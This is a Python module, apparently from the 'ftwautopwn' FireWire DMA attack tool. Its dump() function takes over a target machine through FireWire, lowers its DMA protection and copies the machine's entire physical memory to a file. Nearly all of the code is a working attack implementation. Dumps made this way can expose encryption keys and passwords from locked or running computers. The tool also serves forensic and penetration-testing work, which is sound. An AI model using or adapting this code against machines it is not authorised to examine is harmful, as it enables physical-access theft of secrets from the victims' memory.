'''
Created on Jan 22, 2012

@author: Carsten Maartmann-Moe <carsten@carmaa.com> aka ntropy <n@tropy.org>
'''

from binascii import hexlify
from ftwautopwn import settings
from ftwautopwn.firewire import FireWire
from ftwautopwn.util import msg, fail, MemoryFile, findmemsize, needtoavoid
import sys
import time

def dump():
    # Initialize and lower DMA shield
    if not settings.filemode:
        fw = FireWire()
        start = time.time()
        device_index = fw.select_device()
        # Print selection
        msg('*', 'Selected device: ' + fw.vendors[device_index])#b = Bus()

    # Lower DMA shield or use a file as input
    device = None
    if settings.filemode:
        device = MemoryFile(settings.filename, settings.PAGESIZE)
    else:
        elapsed = int(time.time() - start)
        device = fw.getdevice(device_index, elapsed)
    
    start = settings.dumpstart    
    if settings.dumpsize: 
        size = settings.dumpsize
    else:
        # Determine memory size and set to default if not found
        size = findmemsize(device)
        if not size:
            # TODO: Create a select() method that can cope with defaults
            cont = input('''\
[-] Could not determine memory size: DMA shield may still be up. Try increasing
the delay after enabling SBP2 (-d switch). Do you want to continue and use
the FireWire maximum addressable limit (4 GiB) as memory size? [y/N]: ''')
            if cont in ['y', 'Y']:
                size = settings.memsize
            else:
                fail()
        else:
            msg('*', 'Found memory size: {0:d} MiB. Shields down.'.format(size // settings.MiB))
    
    end = start + size
    requestsize = settings.max_request_size

    filename = 'ftwamemdump_' + hex(start) + '-' + hex(end) + '.bin'
    file = open(filename, 'wb')
    
    msg('*', 'Dumping from {0:#x} to {1:#x}, a total of {2} MiB'.format(start, end, size/settings.MiB))
    
    try:
        for i in range(start, end, requestsize):
            # Avoid accessing upper memory area if we are using FireWire
            if needtoavoid(i):
                data = b'\x00' * requestsize
            else: 
                data = device.read(i, requestsize)
            file.write(data)
            # Print status
            mibaddr = i // settings.MiB
            sys.stdout.write('[*] Dumping memory, {0:>4d} MiB so far.'.format(mibaddr))
            if settings.verbose:
                sys.stdout.write(' Data read: 0x' + hexlify(data).decode(settings.encoding))
            sys.stdout.write('\r')
            sys.stdout.flush()
        file.close()
        print()
        msg('*', 'Dumped memory to file ' + filename)
        device.close()
    except KeyboardInterrupt:
        print()
        raise KeyboardInterrupt